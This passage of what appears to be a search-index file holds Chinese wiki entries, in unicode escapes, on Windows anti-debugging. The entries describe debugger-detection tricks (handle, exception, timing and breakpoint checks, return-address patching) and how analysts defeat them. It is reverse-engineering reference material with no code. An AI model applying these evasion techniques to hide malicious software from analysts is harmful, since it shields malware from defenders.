\u6b64\u5916\uff0c\u5f53\u8c03\u8bd5\u5f00\u59cb\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u521b\u5efa\u7279\u5b9a\u7684\u5185\u6838\u5bf9\u8c61\u3002","title":"\u5bf9\u8c61\u53e5\u67c4"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#openprocess","text":"\u53ef\u4ee5\u901a\u8fc7\u5728 csrss.exe \u8fdb\u7a0b\u4e0a\u4f7f\u7528 kernel32!OpenProcess() \u51fd\u6570\u6765\u68c0\u6d4b\u67d0\u4e9b\u8c03\u8bd5\u5668\u3002 \u4ec5\u5f53\u8fdb\u7a0b\u7684\u7528\u6237\u662f\u7ba1\u7406\u5458\u7ec4\u7684\u6210\u5458\u5e76\u4e14\u5177\u6709\u8c03\u8bd5\u6743\u9650\u65f6\uff0c\u8c03\u7528\u624d\u4f1a\u6210\u529f\u3002","title":"OpenProcess"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#createfile","text":"\u5f53 CREATE_PROCESS_DEBUG_EVENT \u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u88ab\u8c03\u8bd5\u6587\u4ef6\u7684\u53e5\u67c4\u5b58\u50a8\u5728 CREATE_PROCESS_DEBUG_INFO \u7ed3\u6784\u4e2d\u3002 \u56e0\u6b64\uff0c\u8c03\u8bd5\u5668\u53ef\u4ee5\u4ece\u6b64\u6587\u4ef6\u4e2d\u8bfb\u53d6\u8c03\u8bd5\u4fe1\u606f\u3002 \u5982\u679c\u8c03\u8bd5\u5668\u672a\u5173\u95ed\u6b64\u53e5\u67c4\uff0c\u5219\u4e0d\u4f1a\u4ee5\u72ec\u5360\u8bbf\u95ee\u65b9\u5f0f\u6253\u5f00\u8be5\u6587\u4ef6\u3002 \u6709\u4e9b\u8c03\u8bd5\u5668\u53ef\u80fd\u4f1a\u5fd8\u8bb0\u5173\u95ed\u53e5\u67c4\u3002 \u8fd9\u4e2a\u6280\u5de7\u4f7f\u7528 kernel32!CreateFileW() \u6216 kernel32!CreateFileA() \u4ee5\u72ec\u5360\u65b9\u5f0f\u6253\u5f00\u5f53\u524d\u8fdb\u7a0b\u7684\u6587\u4ef6\u3002 \u5982\u679c\u8c03\u7528\u5931\u8d25\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u5f53\u524d\u8fdb\u7a0b\u6b63\u5728\u8c03\u8bd5\u5668\u7684\u5b58\u5728\u4e0b\u8fd0\u884c\u3002","title":"CreateFile"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#closehandle","text":"\u5982\u679c\u8fdb\u7a0b\u5728\u8c03\u8bd5\u5668\u4e0b\u8fd0\u884c\uff0c\u5e76\u4e14\u5c06\u65e0\u6548\u53e5\u67c4\u4f20\u9012\u7ed9 ntdll!NtClose() \u6216 kernel32!CloseHandle() \u51fd\u6570\uff0c\u5219\u4f1a\u5f15\u53d1 EXCEPTION_INVALID_HANDLE (0xC0000008) \u5f02\u5e38\u3002 \u5f02\u5e38\u4f1a\u7531\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7f13\u5b58\u3002 \u5982\u679c\u63a7\u5236\u6743\u88ab\u4f20\u9012\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u5219\u8868\u660e\u5b58\u5728\u8c03\u8bd5\u5668\u3002","title":"CloseHandle"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#loadlibrary","text":"\u5f53\u4f7f\u7528 kernel32!LoadLibraryW() \u6216 kernel32!LoadLibraryA() \u51fd\u6570\u5c06\u6587\u4ef6\u52a0\u8f7d\u5230\u8fdb\u7a0b\u5185\u5b58\u65f6\uff0c\u4f1a\u53d1\u751f LOAD_DLL_DEBUG_EVENT \u4e8b\u4ef6\u3002 \u52a0\u8f7d\u6587\u4ef6\u7684\u53e5\u67c4\u5c06\u5b58\u50a8\u5728 LOAD_DLL_DEBUG_INFO \u7ed3\u6784\u4e2d\u3002 \u56e0\u6b64\uff0c\u8c03\u8bd5\u5668\u53ef\u4ee5\u4ece\u6b64\u6587\u4ef6\u4e2d\u8bfb\u53d6\u8c03\u8bd5\u4fe1\u606f\u3002 \u5982\u679c\u8c03\u8bd5\u5668\u672a\u5173\u95ed\u6b64\u53e5\u67c4\uff0c\u5219\u4e0d\u4f1a\u4ee5\u72ec\u5360\u8bbf\u95ee\u65b9\u5f0f\u6253\u5f00\u8be5\u6587\u4ef6\u3002 \u6709\u4e9b\u8c03\u8bd5\u5668\u53ef\u80fd\u4f1a\u5fd8\u8bb0\u5173\u95ed\u53e5\u67c4\u3002 \u8981\u68c0\u67e5\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kernel32!LoadLibraryA() \u52a0\u8f7d\u4efb\u4f55\u6587\u4ef6\uff0c\u5e76\u5c1d\u8bd5\u4f7f\u7528 kernel32!CreateFileA() \u4ee5\u72ec\u5360\u65b9\u5f0f\u6253\u5f00\u5b83\u3002 \u5982\u679c kernel32!CreateFileA() \u8c03\u7528\u5931\u8d25\uff0c\u5219\u8868\u660e\u8c03\u8bd5\u5668\u5b58\u5728\u3002","title":"LoadLibrary"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ntqueryobject","text":"\u5f53\u8c03\u8bd5\u4f1a\u8bdd\u5f00\u59cb\u65f6\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a\u79f0\u4e3a\u201c\u8c03\u8bd5\u5bf9\u8c61\u201d\u7684\u5185\u6838\u5bf9\u8c61\uff0c\u5e76\u4e0e\u5176\u5173\u8054\u4e00\u4e2a\u53e5\u67c4\u3002 \u4f7f\u7528 ntdll!NtQueryObject() \u51fd\u6570\uff0c\u53ef\u4ee5\u67e5\u8be2\u73b0\u6709\u5bf9\u8c61\u7684\u5217\u8868\uff0c\u5e76\u68c0\u67e5\u4e0e\u4efb\u4f55\u5b58\u5728\u7684\u8c03\u8bd5\u5bf9\u8c61\u5173\u8054\u7684\u53e5\u67c4\u6570\u3002 \u7136\u800c\uff0c\u8fd9\u79cd\u6280\u672f\u65e0\u6cd5\u786e\u5b9a\u5f53\u524d\u8fdb\u7a0b\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5\u3002 \u5b83\u4ec5\u663e\u793a\u81ea\u7cfb\u7edf\u542f\u52a8\u4ee5\u6765\u8c03\u8bd5\u5668\u662f\u5426\u5728\u7cfb\u7edf\u4e0a\u8fd0\u884c\u3002","title":"NtQueryObject"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_7","text":"\u51cf\u8f7b\u8fd9\u4e9b\u68c0\u67e5\u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u624b\u52a8\u8ddf\u8e2a\u7a0b\u5e8f\u76f4\u5230\u68c0\u67e5\u7136\u540e\u8df3\u8fc7\u5b83\uff08\u4f8b\u5982\u4f7f\u7528 NOP \u4fee\u8865\u6216\u66f4\u6539\u6307\u4ee4\u6307\u9488\u6216\u5728\u68c0\u67e5\u540e\u66f4\u6539\u96f6\u6807\u5fd7\uff09\u3002 \u5982\u679c\u60a8\u7f16\u5199\u53cd\u53cd\u8c03\u8bd5\u89e3\u51b3\u65b9\u6848\uff0c\u5219\u9700\u8981\u6302\u94a9\u5217\u51fa\u7684\u51fd\u6570\u5e76\u5728\u5206\u6790\u5176\u8f93\u5165\u540e\u66f4\u6539\u8fd4\u56de\u503c\uff1a ntdll!OpenProcess\uff1a\u5982\u679c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f csrss.exe \u7684\u53e5\u67c4\uff0c\u5219\u8fd4\u56de NULL\u3002 ntdll!NtClose\uff1a\u60a8\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u4f7f\u7528 ntdll!NtQueryObject() \u68c0\u7d22\u6709\u5173\u8f93\u5165\u53e5\u67c4\u7684\u4efb\u4f55\u4fe1\u606f\uff0c\u5e76\u4e14\u5982\u679c\u53e5\u67c4\u65e0\u6548\uff0c\u5219\u4e0d\u4f1a\u5f15\u53d1\u5f02\u5e38\u3002 ntdll!NtQueryObject\uff1a\u5982\u679c\u67e5\u8be2\u4e86 ObjectAllTypesInformation \u7c7b\uff0c\u5219\u4ece\u7ed3\u679c\u4e2d\u8fc7\u6ee4\u8c03\u8bd5\u5bf9\u8c61\u3002 \u4ee5\u4e0b\u6280\u672f\u5e94\u8be5\u5728\u6ca1\u6709\u94a9\u5b50\u7684\u60c5\u51b5\u4e0b\u5904\u7406\uff1a ntdll!NtCreateFile\uff1a\u592a\u901a\u7528\uff0c\u65e0\u6cd5\u7f13\u89e3\u3002 \u4f46\u662f\uff0c\u5982\u679c\u60a8\u4e3a\u7279\u5b9a\u8c03\u8bd5\u5668\u7f16\u5199\u63d2\u4ef6\uff0c\u5219\u53ef\u4ee5\u786e\u4fdd\u88ab\u8c03\u8bd5\u6587\u4ef6\u7684\u53e5\u67c4\u88ab\u5173\u95ed\u3002 kernel32!LoadLibraryW/A\uff1a\u65e0\u53cd\u53cd\u8c03\u8bd5\u63aa\u65bd\u3002","title":"\u7ed3\u8bba"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_8","text":"\u4ee5\u4e0b\u65b9\u6cd5\u6545\u610f\u5f15\u53d1\u5f02\u5e38\uff0c\u4ee5\u9a8c\u8bc1\u8fdb\u4e00\u6b65\u7684\u884c\u4e3a\u5bf9\u4e8e\u6ca1\u6709\u8c03\u8bd5\u5668\u8fd0\u884c\u7684\u8fdb\u7a0b\u662f\u5426\u4e0d\u662f\u5178\u578b\u7684\u3002","title":"\u5f02\u5e38"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#unhandledexceptionfilter","text":"\u5982\u679c\u53d1\u751f\u5f02\u5e38\u5e76\u4e14\u6ca1\u6709\u6ce8\u518c\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff08\u6216\u8005\u6ce8\u518c\u4e86\u4f46\u6ca1\u6709\u5904\u7406\u6b64\u7c7b\u5f02\u5e38\uff09\uff0c\u5219\u4f1a\u8c03\u7528 kernel32!UnhandledExceptionFilter() \u51fd\u6570\u3002 \u53ef\u4ee5\u4f7f\u7528 kernel32!SetUnhandledExceptionFilter() \u6ce8\u518c\u81ea\u5b9a\u4e49\u672a\u5904\u7406\u5f02\u5e38\u8fc7\u6ee4\u5668\u3002 \u4f46\u5982\u679c\u7a0b\u5e8f\u5728\u8c03\u8bd5\u5668\u4e0b\u8fd0\u884c\uff0c\u5219\u4e0d\u4f1a\u8c03\u7528\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\uff0c\u5e76\u4e14\u5f02\u5e38\u5c06\u4f20\u9012\u7ed9\u8c03\u8bd5\u5668\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u6ce8\u518c\u4e86\u672a\u5904\u7406\u7684\u5f02\u5e38\u8fc7\u6ee4\u5668\u5e76\u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u5b83\uff0c\u5219\u8be5\u8fdb\u7a0b\u4e0d\u4f1a\u4f7f\u7528\u8c03\u8bd5\u5668\u8fd0\u884c\u3002","title":"UnhandledExceptionFilter"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#raiseexception","text":"DBC_CONTROL_C \u6216 DBG_RIPEVENT \u7b49\u5f02\u5e38\u4e0d\u4f1a\u4f20\u9012\u5230\u5f53\u524d\u8fdb\u7a0b\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u800c\u662f\u7531\u8c03\u8bd5\u5668\u4f7f\u7528\u3002 \u8fd9\u8ba9\u6211\u4eec\u53ef\u4ee5\u6ce8\u518c\u4e00\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u4f7f\u7528 kernel32!RaiseException() \u51fd\u6570\u5f15\u53d1\u8fd9\u4e9b\u5f02\u5e38\uff0c\u5e76\u68c0\u67e5\u63a7\u5236\u662f\u5426\u4f20\u9012\u7ed9\u6211\u4eec\u7684\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u672a\u8c03\u7528\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u5219\u8fdb\u7a0b\u53ef\u80fd\u6b63\u5728\u8c03\u8bd5\u4e2d\u3002","title":"RaiseException"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_9","text":"\u8fd9\u79cd\u65b9\u6cd5\u4e0d\u4f1a\u68c0\u67e5\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728\uff0c\u4f46\u6709\u52a9\u4e8e\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5e8f\u5217\u4e2d\u9690\u85cf\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u3002 \u6211\u4eec\u53ef\u4ee5\u6ce8\u518c\u4e00\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff08\u7ed3\u6784\u5316\u6216\u5411\u91cf\u5316\uff09\uff0c\u5b83\u5f15\u53d1\u53e6\u4e00\u4e2a\u5f02\u5e38\uff0c\u8be5\u5f02\u5e38\u88ab\u4f20\u9012\u5230\u4e0b\u4e00\u4e2a\u5f15\u53d1\u4e0b\u4e00\u4e2a\u5f02\u5e38\u7684\u5904\u7406\u7a0b\u5e8f\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002 \u6700\u540e\uff0c\u5904\u7406\u7a0b\u5e8f\u7684\u5e8f\u5217\u5e94\u8be5\u6307\u5411\u6211\u4eec\u60f3\u8981\u9690\u85cf\u7684\u8fc7\u7a0b\u3002","title":"\u4f7f\u7528\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u9690\u85cf\u63a7\u5236\u6d41"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_10","text":"\u5bf9\u4e8eUnhandledExceptionFilter\uff0c\u53ea\u9700\u7528 NOP \u586b\u5145\u76f8\u5e94\u7684\u68c0\u67e5\u5373\u53ef\u3002 \u5bf9\u4e8e\u9690\u85cf\u63a7\u5236\u6d41\uff0c\u5fc5\u987b\u624b\u52a8\u8ddf\u8e2a\u7a0b\u5e8f\u76f4\u5230\u6709\u6548\u8d1f\u8f7d\u3002 \u5bf9\u4e8eRaiseException\uff0c\u6b64\u7c7b\u6280\u672f\u7684\u95ee\u9898\u662f\u4e0d\u540c\u7684\u8c03\u8bd5\u5668\u4f1a\u6d88\u8017\u4e0d\u540c\u7684\u5f02\u5e38\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5c06\u5b83\u4eec\u8fd4\u56de\u7ed9\u8c03\u8bd5\u5668\u3002 \u8fd9\u610f\u5473\u7740\u60a8\u5fc5\u987b\u4e3a\u7279\u5b9a\u8c03\u8bd5\u5668\u5b9e\u73b0\u4e00\u4e2a\u63d2\u4ef6\uff0c\u5e76\u66f4\u6539\u5728\u76f8\u5e94\u5f02\u5e38\u540e\u89e6\u53d1\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u7684\u884c\u4e3a\u3002","title":"\u7ed3\u8bba"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_11","text":"\u5f53\u5728\u8c03\u8bd5\u5668\u4e2d\u8ddf\u8e2a\u8fdb\u7a0b\u65f6\uff0c\u6307\u4ee4\u548c\u6267\u884c\u4e4b\u95f4\u5b58\u5728\u5de8\u5927\u7684\u5ef6\u8fdf\u3002 \u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u65b9\u6cd5\u6d4b\u91cf\u4ee3\u7801\u67d0\u4e9b\u90e8\u5206\u4e4b\u95f4\u7684\u201c\u672c\u673a\u201d\u5ef6\u8fdf\uff0c\u5e76\u5c06\u5176\u4e0e\u5b9e\u9645\u5ef6\u8fdf\u8fdb\u884c\u6bd4\u8f83\u3002","title":"\u65f6\u673a"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#rdpmcrdtsc","text":"\u8fd9\u4e9b\u6307\u4ee4\u9700\u8981\u5728 CR4 \u5bc4\u5b58\u5668\u4e2d\u8bbe\u7f6e\u6807\u5fd7 PCE\u3002 RDPMC \u6307\u4ee4\u53ea\u80fd\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u4f7f\u7528\u3002","title":"RDPMC/RDTSC"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#getlocaltime","text":"","title":"GetLocalTime"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#getsystemtime","text":"","title":"GetSystemTime"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#gettickcount","text":"","title":"GetTickCount"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#zwgettickcount-kigettickcount","text":"\u8fd9\u4e24\u4e2a\u51fd\u6570\u90fd\u53ea\u80fd\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u4f7f\u7528\u3002 \u5c31\u50cf\u7528\u6237\u6a21\u5f0f GetTickCount() \u6216 GetSystemTime() \u4e00\u6837\uff0c\u5185\u6838\u6a21\u5f0f ZwGetTickCount() \u4ece KUSER_SHARED_DATA \u9875\u8bfb\u53d6\u3002 \u8be5\u9875\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6620\u5c04\u5230\u865a\u62df\u5730\u5740\u7684\u7528\u6237\u6a21\u5f0f\u8303\u56f4\u5185\uff0c\u5e76\u5728\u5185\u6838\u8303\u56f4\u5185\u4ee5\u8bfb\u5199\u65b9\u5f0f\u6620\u5c04\u3002 \u7cfb\u7edf\u65f6\u949f\u6ef4\u7b54\u66f4\u65b0\u7cfb\u7edf\u65f6\u95f4\uff0c\u7cfb\u7edf\u65f6\u95f4\u76f4\u63a5\u5b58\u50a8\u5728\u8be5\u9875\u9762\u4e2d\u3002 ZwGetTickCount() \u7684\u4f7f\u7528\u65b9\u5f0f\u4e0e GetTickCount() \u76f8\u540c\u3002 \u4f7f\u7528 KiGetTickCount() \u6bd4\u8c03\u7528 ZwGetTickCount() \u66f4\u5feb\uff0c\u4f46\u6bd4\u76f4\u63a5\u4ece KUSER_SHARED_DATA \u9875\u8bfb\u53d6\u7a0d\u6162\u3002","title":"ZwGetTickCount() / KiGetTickCount()"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#queryperformancecounter","text":"","title":"QueryPerformanceCounter"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#timegettime","text":"","title":"timeGetTime"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_12","text":"\u8c03\u8bd5\u671f\u95f4\uff1a\u53ea\u9700\u7528 NOP \u586b\u5145\u65f6\u5e8f\u68c0\u67e5\u5e76\u5c06\u8fd9\u4e9b\u68c0\u67e5\u7684\u7ed3\u679c\u8bbe\u7f6e\u4e3a\u9002\u5f53\u7684\u503c\u5373\u53ef\u3002 \u5bf9\u4e8e\u53cd\u53cd\u8c03\u8bd5\u89e3\u51b3\u65b9\u6848\u5f00\u53d1\uff1a\u6ca1\u6709\u5fc5\u8981\u5bf9\u5176\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u56e0\u4e3a\u6240\u6709\u65f6\u5e8f\u68c0\u67e5\u90fd\u4e0d\u662f\u5f88\u53ef\u9760\u3002 \u60a8\u4ecd\u7136\u53ef\u4ee5\u6302\u94a9\u8ba1\u65f6\u529f\u80fd\u5e76\u52a0\u5feb\u8c03\u7528\u4e4b\u95f4\u7684\u65f6\u95f4\u3002","title":"\u7ed3\u8bba"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_13","text":"\u8fdb\u7a0b\u53ef\u4ee5\u68c0\u67e5\u81ea\u5df1\u7684\u5185\u5b58\u4ee5\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u5b58\u5728\u6216\u5e72\u6270\u8c03\u8bd5\u5668\u3002 \u672c\u8282\u5305\u62ec\u8fdb\u7a0b\u5185\u5b58\u548c\u68c0\u67e5\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u3001\u641c\u7d22\u65ad\u70b9\u4ee5\u53ca\u4f5c\u4e3a\u53cd\u9644\u52a0\u65b9\u6cd5\u7684\u51fd\u6570\u4fee\u8865\u3002","title":"\u8fdb\u7a0b\u5185\u5b58"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_14","text":"\u59cb\u7ec8\u53ef\u4ee5\u68c0\u67e5\u8fdb\u7a0b\u5185\u5b58\u5e76\u641c\u7d22\u4ee3\u7801\u4e2d\u7684\u8f6f\u4ef6\u65ad\u70b9\uff0c\u6216\u8005\u68c0\u67e5 CPU \u8c03\u8bd5\u5bc4\u5b58\u5668\u4ee5\u786e\u5b9a\u662f\u5426\u8bbe\u7f6e\u4e86\u786c\u4ef6\u65ad\u70b9\u3002","title":"\u65ad\u70b9"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#int3","text":"\u8fd9\u4e2a\u60f3\u6cd5\u662f\u4e3a\u4e86\u8bc6\u522b 0xCC \u5b57\u8282\uff08\u4ee3\u8868 INT 3 \u6c47\u7f16\u6307\u4ee4\uff09\u7684\u67d0\u4e9b\u51fd\u6570\u7684\u673a\u5668\u4ee3\u7801\u3002 \u6b64\u65b9\u6cd5\u53ef\u80fd\u4f1a\u4ea7\u751f\u8bb8\u591a\u8bef\u62a5\uff0c\u56e0\u6b64\u5e94\u8c28\u614e\u4f7f\u7528\u3002","title":"\u8f6f\u4ef6\u65ad\u70b9(INT3)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_15","text":"\u8c03\u8bd5\u5668\u5141\u8bb8\u60a8\u5355\u6b65\u6267\u884c\u51fd\u6570\u8c03\u7528\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8c03\u8bd5\u5668\u4f1a\u5728\u8c03\u7528\u4e4b\u540e\u7684\u6307\u4ee4\uff08\u5373\u88ab\u8c03\u7528\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff09\u4e0a\u9690\u5f0f\u8bbe\u7f6e\u8f6f\u4ef6\u65ad\u70b9\u3002 \u4e3a\u4e86\u68c0\u6d4b\u662f\u5426\u8bd5\u56fe\u8df3\u8fc7\u8be5\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u8fd4\u56de\u5730\u5740\u5904\u7684\u5185\u5b58\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u3002 \u5982\u679c\u8f6f\u4ef6\u65ad\u70b9\uff080xCC\uff09\u4f4d\u4e8e\u8fd4\u56de\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5176\u4ed6\u6307\u4ee4\uff08\u4f8b\u5982 NOP\uff09\u5bf9\u5176\u8fdb\u884c\u4fee\u8865\u3002 \u5b83\u5f88\u53ef\u80fd\u4f1a\u7834\u574f\u4ee3\u7801\u5e76\u4f7f\u8fdb\u7a0b\u5d29\u6e83\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4e00\u4e9b\u6709\u610f\u4e49\u7684\u4ee3\u7801\u800c\u4e0d\u662fNOP\u6765\u4fee\u8865\u8fd4\u56de\u5730\u5740\uff0c\u5e76\u66f4\u6539\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u7a0b\u3002","title":"\u9632\u8de8\u6b65"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_16","text":"\u53ef\u4ee5\u4ece\u51fd\u6570\u5185\u90e8\u68c0\u67e5\u8c03\u7528\u8be5\u51fd\u6570\u540e\u662f\u5426\u5b58\u5728\u8f6f\u4ef6\u65ad\u70b9\u3002 \u6211\u4eec\u53ef\u4ee5\u5728\u8fd4\u56de\u5730\u5740\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u8be5\u5b57\u8282\u7b49\u4e8e0xCC\uff08INT 3\uff09\uff0c\u5219\u53ef\u4ee5\u75280x90\uff08NOP\uff09\u91cd\u5199\u5b83\u3002 \u8be5\u8fdb\u7a0b\u53ef\u80fd\u4f1a\u5d29\u6e83\uff0c\u56e0\u4e3a\u6211\u4eec\u635f\u574f\u4e86\u8fd4\u56de\u5730\u5740\u5904\u7684\u6307\u4ee4\u3002 \u4f46\u662f\uff0c\u5982\u679c\u60a8\u77e5\u9053\u51fd\u6570\u8c03\u7528\u540e\u9762\u662f\u54ea\u6761\u6307\u4ee4\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5\u6307\u4ee4\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u91cd\u5199\u65ad\u70b9\u3002","title":"\u76f4\u63a5\u4fee\u6539\u5185\u5b58"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#readfile","text":"\u8be5\u65b9\u6cd5\u4f7f\u7528 kernel32!ReadFile() \u51fd\u6570\u6765\u4fee\u8865\u8fd4\u56de\u5730\u5740\u5904\u7684\u4ee3\u7801\u3002 \u8fd9\u4e2a\u60f3\u6cd5\u662f\u8bfb\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5e76\u5c06\u8fd4\u56de\u5730\u5740\u4f5c\u4e3a\u8f93\u51fa\u7f13\u51b2\u533a\u4f20\u9012\u7ed9 kernel32!ReadFile() \u3002 \u8fd4\u56de\u5730\u5740\u5904\u7684\u5b57\u8282\u5c06\u7528\u201cM\u201d\u5b57\u7b26\uff08PE \u6620\u50cf\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff09\u8fdb\u884c\u4fee\u8865\uff0c\u5e76\u4e14\u8fdb\u7a0b\u53ef\u80fd\u4f1a\u5d29\u6e83\u3002","title":"ReadFile"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#writeprocessmemory","text":"\u6b64\u65b9\u6cd5\u4f7f\u7528 `kernel32!WriteProcessMemory() 